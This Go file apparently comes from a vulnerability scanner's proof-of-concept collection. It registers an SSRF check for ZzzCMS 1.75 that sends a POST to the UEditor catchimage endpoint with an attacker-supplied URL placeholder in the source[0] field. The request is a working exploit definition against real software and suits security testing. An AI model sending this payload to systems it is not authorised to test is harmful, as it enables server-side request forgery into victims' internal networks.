package poc

func (Info *PocInfo) ZzzCMS_V175_SSRF_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = ""
	poc.Info.Target = "zzzcms"
	poc.Info.Type = "SSRF"
	poc.Info.Name = "ZzzCMS 1.75 SSRF"
	poc.Info.Level = 1
	poc.Info.Author = "youzai"

	// 设置poc-Poc信息
	poc.Poc.Proto = "http"
	poc.Poc.Method = "POST"
	poc.Poc.Path = []string{"/plugins/ueditor/php/controller.php?action=catchimage&upfolder=1"}
	poc.Poc.Param = []string{"subdomain"}
	poc.Poc.Header = func() map[string]string {
		mapTemp := make(map[string]string)
		mapTemp["Content-Type"] = "application/x-www-form-urlencoded"
		return mapTemp
	}()
	poc.Poc.Data = []string{"source[0]=http://{{SSRF_URL}}/"}
	poc.Poc.Word = nil

	// 设置poc-Config信息
	poc.Config.Customize = false

	PocStruct = append(PocStruct, poc)
}
